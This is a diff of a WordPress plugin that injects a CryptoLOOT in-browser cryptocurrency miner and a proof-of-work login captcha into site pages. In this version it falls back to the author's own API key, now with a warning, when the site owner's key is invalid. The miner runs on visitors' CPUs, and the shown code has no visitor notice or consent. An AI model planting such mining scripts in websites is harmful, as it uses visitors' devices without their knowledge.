@@ -3,14 +3,31 @@
 Plugin Name: WP CryptoLOOT
 Description: This plugin will add CryptoLOOT miner and captcha capabilities to a WordPress installation. Requires a CryptoLOOT account.
 Plugin URI: https://github.com/scowebb/wp-cryptoloot/
-Version: 1.0
+Version: 1.1
 Author: @scowebb
 Author URI: https://github.com/scowebb/
 License: GNU GPLv2 or later
 Text Domain: wp-cryptoloot
-*/
+**/
+/*     
+This plugin will add CryptoLOOT miner and captcha capabilities to a WordPress installation. Requires a CryptoLOOT account.
 
-// 7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9
+Copyright (C) 2020 Scott Webber
+
+This program is free software; you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation; either version 2 of the License, or
+(at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License along
+with this program; if not, write to the Free Software Foundation, Inc.,
+51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. 
+**/
 
 if( !defined( 'ABSPATH' ) ) {
 	exit();
@@ -18,7 +35,7 @@ if( !defined( 'ABSPATH' ) ) {
 
 define( 'WPCL_VERSION', '1.0' );
 define( 'WPCL_PLUGIN_URL', plugin_dir_url( __FILE__ ) );
-define( 'WPCL_REF_URL', esc_url( 'https://crypto-loot.com/ref.php?go=aa489c6aafb514f720c145f199c25428' ) );
+define( 'WPCL_REF_URL', esc_url( 'https://crypto-loot.org/ref.php?go=aa489c6aafb514f720c145f199c25428' ) );
 
 register_deactivation_hook( __FILE__, 'wpcl_deactivate_plugin' );
 
@@ -101,9 +118,9 @@ if( !function_exists( 'cryptoloot_miner_payload' ) ) {
 			$crypto_miner = '
 <script src="//statdynamic.com/lib/crypta.js"></script>
 <script>
-var miner=new CRLT.Anonymous(\''.$public_key.'\', {
-	threads:'.$threads.', throttle:'.$throttle.', coin: "upx",
-	});
+	var miner=new CRLT.Anonymous(\''.$public_key.'\', {
+		threads:'.$threads.', throttle:'.$throttle.', coin: "upx",
+		});
 	'.( $checked == true ? $initiate : '' ).'
 </script>
 			';
@@ -132,8 +149,8 @@ if( !function_exists( 'cryptoloot_login_captcha_payload' ) ) {
 			$payload = '
 <script src="https://verifypow.com/lib/captcha.min.js" async></script>
 <div class="CRLT-captcha" data-hashes="'.$login_hashes.'" data-key="'.$public_key.'" data-disable-elements="input[type=submit]">
-<em>Loading Captcha...<br>
-If it doesn\'t load, please disable Adblock!</em>
+	<em>Loading Captcha...<br>
+	If it doesn\'t load, please disable Adblock!</em>
 </div>
 			';
 			echo $payload;
@@ -161,8 +178,8 @@ if( !function_exists( 'cryptoloot_register_captcha_payload' ) ) {
 			$payload = '
 <script src="https://verifypow.com/lib/captcha.min.js" async></script>
 <div class="CRLT-captcha" data-hashes="'.$register_hashes.'" data-key="'.$public_key.'" data-disable-elements="input[type=submit]">
-<em>Loading Captcha...<br>
-If it doesn\'t load, please disable Adblock!</em>
+	<em>Loading Captcha...<br>
+	If it doesn\'t load, please disable Adblock!</em>
 </div>
 			';
 			echo $payload;
@@ -325,14 +342,26 @@ if( !function_exists( 'cryptoloot_loader' ) ) {
 
 		function wpcl_public_key_render() {
 			$options = get_option( 'wpcl_settings' );
+			$_error = false;
 			if( isset( $options['wpcl_public_key'] ) ) {
 				$check_key = $options['wpcl_public_key'];
 				$length = strlen( $check_key );
-				( $length !== 44 ? $public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9' : $public_key = $options['wpcl_public_key'] );
+				$alnum_check = ctype_alnum( $check_key );
+				if( $length == 44 && $alnum_check == true ) {
+					$public_key = $options['wpcl_public_key'];
+				} else {
+					$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
+					$_error = true;
+				}
+			} else {
+				$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
 			}
 			$html = '<input type="text" name="wpcl_settings[wpcl_public_key]" length="44" value="'.$public_key.'" />';
-			$error = '<span class="error"></span>';
+			$error = '<br> <span class="error"><b>WARNING</b>: You\'ll be using my API key since yours is not valid.</span>';
 			echo $html;
+			if( $_error == true ) {
+				echo $error;
+			}
 		}
 		
 		function wpcl_auto_miner_render() {
@@ -386,7 +415,7 @@ if( !function_exists( 'cryptoloot_loader' ) ) {
 				$miner_start = false;
 			}
 			$hidden = '<input type="hidden" name="wpcl_settings[wpcl_miner_start]" value="0" />';
-			$html = '<input type="checkbox" name="wpcl_settings[wpcl_miner_start]" value="1" '.checked( 1, $miner_start, false ).' /> <text>This box must be checked for the miner to run.</text>';
+			$html = '<input type="checkbox" name="wpcl_settings[wpcl_miner_start]" value="1" '.checked( 1, $miner_start, false ).' /> <text>Check this box to start the miner.</text>';
 			echo $hidden;
 			echo $html;
 		}
